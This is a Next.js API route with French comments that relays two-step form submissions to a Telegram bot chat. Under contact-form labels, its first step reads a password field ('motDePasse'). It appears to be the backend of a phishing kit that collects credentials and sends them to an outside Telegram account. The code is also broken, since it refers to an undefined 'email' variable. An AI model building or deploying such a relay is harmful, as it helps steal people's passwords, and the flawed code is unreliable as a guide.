// /pages/api/webhook.js
// Next.js API route style. Gère CORS pour développement local.
// IMPORTANT: définis TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID en variable d'env.

async function getFetch() {
  if (typeof fetch !== "undefined") return fetch;
  try {
    const nodeFetch = await import("node-fetch");
    return nodeFetch.default;
  } catch (e) {
    throw new Error("fetch non disponible. Installez node-fetch ou utilisez Node >=18.");
  }
}

function escapeHtml(str = "") {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function corsHeaders(req) {
  // Tu peux définir CORS_ORIGIN dans tes env (ex: http://localhost:3000)
  const allowed = process.env.CORS_ORIGIN || "*";
  return {
    "Access-Control-Allow-Origin": allowed,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
}

export default async function handler(req, res) {
  // Répondre aux preflight CORS
  if (req.method === "OPTIONS") {
    const headers = corsHeaders(req);
    res.setHeader("Access-Control-Allow-Origin", headers["Access-Control-Allow-Origin"]);
    res.setHeader("Access-Control-Allow-Methods", headers["Access-Control-Allow-Methods"]);
    res.setHeader("Access-Control-Allow-Headers", headers["Access-Control-Allow-Headers"]);
    return res.status(204).end();
  }

  // Autoriser seulement POST pour l'API réelle
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST, OPTIONS");
    const headers = corsHeaders(req);
    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  const fetchFn = await getFetch();

  try {
    const body = req.body;
    const data = typeof body === "string" ? JSON.parse(body) : body;
    const { type, payload } = data || {};

    if (!type || !payload || typeof payload !== "object") {
      const headers = corsHeaders(req);
      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
      return res.status(400).json({ error: "Payload invalide" });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars");
      const headers = corsHeaders(req);
      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
      return res.status(500).json({ error: "Configuration serveur manquante" });
    }

    // Compose message
    let text = "";
    if (type === "contact_info") {
      const name = escapeHtml(payload.name || "—");
      const motDePasse = escapeHtml(payload.motDePasse || "—");
      text = `<b>📨 Nouveau contact (étape 1)</b>\n\n<b>Nom :</b> ${name}\n<b>Email :</b> ${email}`;
    } else if (type === "message") {
      const name = escapeHtml(payload.name || "—");
      const phone = escapeHtml(payload.phone || "—");
      text = `<b>💬 Message reçu (étape 2)</b>\n\n<b>Nom :</b> ${name}\n<b>Message :</b>\n${phone}`;
    } else {
      const headers = corsHeaders(req);
      Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
      return res.status(400).json({ error: "Type inconnu" });
    }

    const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const tgResp = await fetchFn(tgUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const tgJson = await tgResp.json();
    const headers = corsHeaders(req);
    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));

    if (!tgJson.ok) {
      console.error("Telegram error:", tgJson);
      return res.status(502).json({ error: "Erreur côté Telegram", details: tgJson });
    }

    return res.status(200).json({ ok: true, result: tgJson.result });
  } catch (err) {
    console.error("Erreur webhook:", err);
    const headers = corsHeaders(req);
    Object.entries(headers).forEach(([k, v]) => res.setHeader(k, v));
    return res.status(500).json({ error: "Erreur serveur", details: err.message });
  }
}
